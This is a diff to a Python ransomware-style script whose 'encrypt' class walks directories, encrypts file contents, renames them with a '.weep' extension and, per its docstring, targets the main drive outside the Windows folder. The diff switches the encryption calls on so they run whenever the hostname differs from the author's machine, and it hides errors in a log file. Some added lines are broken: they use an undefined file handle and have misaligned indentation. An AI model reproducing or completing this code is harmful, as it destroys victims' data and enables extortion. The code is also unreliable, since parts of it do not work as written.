@@ -31,10 +31,13 @@ class encrypt(object):
         cmd ="echo %SystemRoot%"
         p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True) # return CompletedProcess Class
         if p.stderr!="":
-            print(p.stderr)
-            print('program terminated in 5 sec')
-            time.sleep(5)
-            exit()
+            if os.path.exists('errorfile.txt'):
+                writemode ='a'
+            else:
+                writemode ='w'
+            with open('errorfile.txt',writemode,encoding='utf-8'):
+                f.write(p.stderr)
+                f.write('\n')
         return p.stdout.split(':')[0]    
 
     def run(self):
@@ -65,7 +68,13 @@ class encrypt(object):
                                 f.write(self.encrypt(data))
                             os.rename(walkingdir,walkingdir+'.weep')
                         except Exception as exception:
-                            print(exception)
+                            if os.path.exists('errorfile.txt'):
+                                writemode ='a'
+                            else:
+                                writemode ='w'
+                            with open('errorfile.txt',writemode,encoding='utf-8'):
+                                f.write(exception)
+                                f.write('\n')
     def runinC(self):
         """
         This should encrypt maindrive except for Windows directory
@@ -90,7 +99,13 @@ class encrypt(object):
                                 f.write(self.encrypt(data))
                             os.rename(walkingdir,walkingdir+'.weep')
                         except Exception as exception:
-                            print(exception)
+                            if os.path.exists('errorfile.txt'):
+                                writemode ='a'
+                        else:
+                                writemode ='w'
+                        with open('errorfile.txt',writemode,encoding='utf-8'):
+                            f.write(exception)
+                            f.write('\n')
     @staticmethod
     def EmergencyBreak():
         cmd ='hostname'
@@ -102,19 +117,14 @@ if __name__ == "__main__":
     try:
         if encrypt.EmergencyBreak()=='DESKTOP-3E4AAU5':
             exit()
-        else:
-            print('False')
+        testobj = encrypt()
+        testobj.run()
+        testobj.runinC()
     except Exception as exception:
-        exit()
-
-    # try:
-    #     testobj = encrypt()
-    #     testobj.run()
-    #     testobj.runinC()
-    # except Exception as exception:
-    #     if os.path.exists('errorslog.txt'):
-    #         writemode = 'a'
-    #     else:
-    #         writemode ='w'
-    #     with open('errorslog.txt',writemode,encoding='utf-8')as f:
-    #         f.write(exception+'\n')    
+        if os.path.exists('errorslog.txt'):
+            writemode = 'a'
+        else:
+            writemode ='w'
+        with open('errorslog.txt',writemode,encoding='utf-8')as f:
+            f.write(exception)
+            f.write('\n')    
